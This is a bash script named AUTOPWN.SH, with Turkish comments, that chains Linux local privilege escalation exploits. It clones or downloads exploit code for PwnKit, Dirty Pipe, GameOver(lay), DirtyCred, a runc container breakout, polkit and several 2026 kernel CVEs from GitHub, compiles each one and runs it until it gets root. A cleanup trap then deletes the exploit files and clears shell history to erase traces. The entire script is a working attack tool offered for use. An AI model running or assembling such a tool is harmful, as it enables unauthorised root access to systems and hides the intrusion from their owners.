#!/bin/bash
# ============================================
#    AUTOPWN.SH - ULTIMATE ZERO-FOOTPRINT VERSION
# ============================================

cleanup() {
    echo -e "\n[*] Temizlik yapiliyor: Tum gecici dosya ve dizinler temizleniyor..."
    rm -rf /tmp/CVE-* /tmp/dirty* /tmp/pwn* /tmp/gameover* /tmp/pocs /tmp/Dirty* /tmp/cve-* /tmp/cybermeowfia /tmp/tontou* /tmp/OVSwrap /tmp/runc-breakout 2>/dev/null
    history -c 2>/dev/null
    echo "[+] Sistem tertemiz birakildi."
}

trap cleanup EXIT INT TERM

check_root() {
    if [ "$EUID" -eq 0 ]; then
        echo ""
        echo "##################################################"
        echo "#                                                #"
        echo "#   [+] BASARILI! ROOT YETKISI ELDE EDILDI!      #"
        echo "#   [+] Mevcut Kullanici: $(whoami)                      #"
        echo "#                                                #"
        echo "##################################################"
        echo ""
        exit 0
    fi
}

echo "[*] Autopwn tam kapsaml modda baslatiliyor..."
whoami
id

if ! command -v gcc &> /dev/null; then
    echo "[*] Temel araclar yukleniyor..."
    sudo apt update && sudo apt install -y build-essential git curl wget unzip
fi

cd /tmp || exit

# ============================================
#       1. KESIN CALISAN (LEGACY & PROVEN)
# ============================================
echo "--------------------------------------------------"
echo "[+] PwnKit (CVE-2021-4034) deneniyor..."
echo "--------------------------------------------------"
rm -rf /tmp/CVE-2021-4034 /tmp/pwn.c /tmp/pwn
curl -fsSL https://raw.githubusercontent.com/arthepsy/CVE-2021-4034/refs/heads/main/cve-2021-4034-poc.c -o /tmp/pwn.c
gcc /tmp/pwn.c -o /tmp/pwn && /tmp/pwn
check_root
echo ""

echo "--------------------------------------------------"
echo "[+] Dirty Pipe (CVE-2022-0847) deneniyor..."
echo "--------------------------------------------------"
rm -rf /tmp/dirtypipe
git clone https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit.git /tmp/dirtypipe
cd /tmp/dirtypipe && gcc exploit.c -o exploit && ./exploit
check_root
echo ""

echo "--------------------------------------------------"
echo "[+] GameOver(lay) (CVE-2023-2640 + CVE-2023-32629) deneniyor..."
echo "--------------------------------------------------"
curl -fsSL https://raw.githubusercontent.com/g1vi/CVE-2023-2640-CVE-2023-32629/main/exploit.sh -o /tmp/gameover.sh
chmod +x /tmp/gameover.sh && /tmp/gameover.sh
check_root
echo ""

# ============================================
#       2. KERNEL'E BAGLI & YENI CVE'LER
# ============================================
echo "--------------------------------------------------"
echo "[+] Dirty Cred deneniyor..."
echo "--------------------------------------------------"
rm -rf /tmp/dirtycred
git clone https://github.com/PR0fix/DirtyCred.git /tmp/dirtycred
cd /tmp/dirtycred && make && ./exploit
check_root
echo ""

echo "--------------------------------------------------"
echo "[+] DirtyFrag deneniyor..."
echo "--------------------------------------------------"
rm -rf /tmp/dirtyfrag
git clone https://github.com/V4bel/dirtyfrag.git /tmp/dirtyfrag
cd /tmp/dirtyfrag && gcc -O0 -Wall -o exp exp.c -lutil && ./exp
check_root
echo ""

echo "--------------------------------------------------"
echo "[+] FragNesia deneniyor..."
echo "--------------------------------------------------"
rm -rf /tmp/pocs
git clone https://github.com/v12-security/pocs.git /tmp/pocs
cd /tmp/pocs/fragnesia && gcc -o exp fragnesia.c && ./exp
check_root
echo ""

echo "--------------------------------------------------"
echo "[+] TONTOU (Spectre v2 bypass) deneniyor..."
echo "--------------------------------------------------"
rm -rf /tmp/tontou-main /tmp/tontou.zip
wget -q https://github.com/CSAIL-Arch-Sec/tontou/archive/refs/heads/main.zip -O /tmp/tontou.zip
unzip -o /tmp/tontou.zip -d /tmp
cd /tmp/tontou-main && make && ./tontou
check_root
echo ""

echo "--------------------------------------------------"
echo "[+] CVE-2026-46215 deneniyor..."
echo "--------------------------------------------------"
rm -rf /tmp/CVE-2026-46215
git clone https://github.com/bluedragonsecurity/CVE-2026-46215-exploit-linux-7.0-uaf-stable.git /tmp/CVE-2026-46215
cd /tmp/CVE-2026-46215 && gcc -o exploit exploit.c -lpthread -static && ./exploit
check_root
echo ""

# ============================================
#       3. SERVIS BAZLI & KONTEYNER
# ============================================
echo "--------------------------------------------------"
echo "[+] Polkit / DBus LPE (CVE-2021-3560) deneniyor..."
echo "--------------------------------------------------"
rm -rf /tmp/cve-2021-3560
git clone https://github.com/cybersecurityworks/CVE-2021-3560-Exploit-POC.git /tmp/cve-2021-3560
cd /tmp/cve-2021-3560 && python3 cve-2021-3560.py
check_root
echo ""

echo "--------------------------------------------------"
echo "[+] runc Container Breakout (CVE-2024-21626 tarzı) deneniyor..."
echo "--------------------------------------------------"
rm -rf /tmp/runc-breakout
git clone https://github.com/snyk/CVE-2024-21626-PoC.git /tmp/runc-breakout
cd /tmp/runc-breakout && ./exploit.sh
check_root
echo ""

echo "--------------------------------------------------"
echo "[+] OVSwrap deneniyor..."
echo "--------------------------------------------------"
rm -rf /tmp/OVSwrap
git clone https://github.com/manizada/OVSwrap.git /tmp/OVSwrap
cd /tmp/OVSwrap && python3 ovswrap-poc.py
check_root
echo ""

# ============================================
#       4. 2026 GUNCEL VE ÖZEL EXPLOITLER
# ============================================
echo "--------------------------------------------------"
echo "[+] CVE-2026-68138 deneniyor..."
echo "--------------------------------------------------"
rm -rf /tmp/CVE-2026-68138
git clone https://github.com/aramosf/CVE-2026-68138.git /tmp/CVE-2026-68138
cd /tmp/CVE-2026-68138 && ./build.sh && ./build/exploit 2>/dev/null || gcc -O2 -static -pthread -Wall -Wextra -o exploit exploit.c && ./exploit
check_root
echo ""

echo "--------------------------------------------------"
echo "[+] CVE-2026-68398 deneniyor..."
echo "--------------------------------------------------"
rm -rf /tmp/cve-2026-68398
git clone https://github.com/aramosf/cve-2026-68398.git /tmp/cve-2026-68398
cd /tmp/cve-2026-68398 && make && ./build/CVE-2026-68398 auto 60 2>/dev/null || gcc -O2 exploit.c kaslr_prefetch.c -o exploit -lpthread && ./exploit
check_root
echo ""

echo "--------------------------------------------------"
echo "[+] DirtyDecrypt (CVE-2026-31635) deneniyor..."
echo "--------------------------------------------------"
rm -rf /tmp/DirtyDecrypt
git clone https://github.com/0xBlackash/DirtyDecrypt.git /tmp/DirtyDecrypt
cd /tmp/DirtyDecrypt && gcc -O2 -static -pthread CVE-2026-31635.c -o DirtyDecrypt && ./DirtyDecrypt
check_root
echo ""

echo "--------------------------------------------------"
echo "[+] CyberMeowfia (CVE-2026-52923 RHEL) deneniyor..."
echo "--------------------------------------------------"
rm -rf /tmp/cybermeowfia
git clone https://github.com/NebuSec/CyberMeowfia.git /tmp/cybermeowfia
cd /tmp/cybermeowfia/security-research/Linux-CVE-2026-52923-RHEL-6.12.0-211.7.3.el10_2 && make && ./exploit
check_root
echo ""

echo "--------------------------------------------------"
echo "[+] PackageKit (CVE-2026-41651) kontrol ediliyor..."
echo "--------------------------------------------------"
if dpkg -l 2>/dev/null | grep -qi packagekit; then
    rm -rf /tmp/CVE-2026-41651
    git clone https://github.com/Vozec/CVE-2026-41651.git /tmp/CVE-2026-41651
    cd /tmp/CVE-2026-41651 && chmod +x cve-2026-41651 && ./cve-2026-41651
    check_root
else
    echo "[-] PackageKit sistemde bulunamadi."
fi

echo "[*] Tum denemeler tamamlandi (Root elde edilemedi)."
